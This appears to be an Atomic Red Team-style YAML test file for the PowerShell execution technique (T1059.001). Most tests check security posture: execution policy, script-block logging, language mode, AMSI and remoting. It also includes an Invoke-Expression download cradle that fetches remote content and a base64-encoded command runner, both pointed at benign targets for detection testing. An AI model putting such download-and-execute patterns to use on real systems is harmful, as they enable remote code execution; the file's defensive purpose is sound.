attack_technique: T1059.001
display_name: "Command and Scripting Interpreter: PowerShell"
tactic: Execution
atomic_tests:
  - name: "PowerShell Execution Policy Check"
    auto_generated_guid: a1a2a3a4b5b6c7c8d9d0e1e2f3f4a5a6
    description: |
      Checks current PowerShell execution policy across all scopes.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        Get-ExecutionPolicy -List
      elevation_required: false

  - name: "PowerShell Download Cradle (Invoke-Expression)"
    auto_generated_guid: b2b3b4b5c6c7d8d9e0e1f2f3a4a5b6b7
    description: |
      Tests if PowerShell can execute Invoke-Expression download cradle.
      Uses a benign URL to test the pattern.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt")
      elevation_required: false

  - name: "PowerShell Base64 Encoded Command"
    auto_generated_guid: c3c4c5c6d7d8e9e0f1f2a3a4b5b6c7c8
    description: |
      Tests execution of base64 encoded PowerShell commands.
    supported_platforms:
      - windows
    input_arguments:
      encoded_command:
        description: "Base64 encoded command (default: whoami)"
        type: string
        default: "dwBoAG8AYQBtAGkA"
    executor:
      name: command_prompt
      command: |
        powershell.exe -EncodedCommand #{encoded_command}
      elevation_required: false

  - name: "PowerShell Script Block Logging Check"
    auto_generated_guid: d4d5d6d7e8e9f0f1a2a3b4b5c6c7d8d9
    description: |
      Checks if PowerShell Script Block Logging is enabled.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        $path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
        if (Test-Path $path) { Get-ItemProperty $path } else { Write-Output "Script Block Logging: Not Configured" }
        $path2 = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging'
        if (Test-Path $path2) { Get-ItemProperty $path2 } else { Write-Output "Module Logging: Not Configured" }
      elevation_required: false

  - name: "PowerShell Constrained Language Mode Check"
    auto_generated_guid: e5e6e7e8f9f0a1a2b3b4c5c6d7d8e9e0
    description: |
      Checks if PowerShell is running in Constrained Language Mode.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        $ExecutionContext.SessionState.LanguageMode
      elevation_required: false

  - name: "AMSI Bypass Detection Test"
    auto_generated_guid: f6f7f8f9a0a1b2b3c4c5d6d7e8e9f0f1
    description: |
      Tests AMSI by attempting to invoke known AMSI test string.
      This checks if AMSI is active and blocking known signatures.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        try { Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'; Write-Output "AMSI: Not blocking test strings" } catch { Write-Output "AMSI: Active and blocking" }
      elevation_required: false

  - name: "PowerShell Remoting Status Check"
    auto_generated_guid: a7a8a9a0b1b2c3c4d5d6e7e8f9f0a1a2
    description: |
      Checks if WinRM/PowerShell remoting is enabled.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        Test-WSMan -ErrorAction SilentlyContinue
        Get-PSSessionConfiguration -ErrorAction SilentlyContinue | Select-Object Name,Enabled,Permission
      elevation_required: false
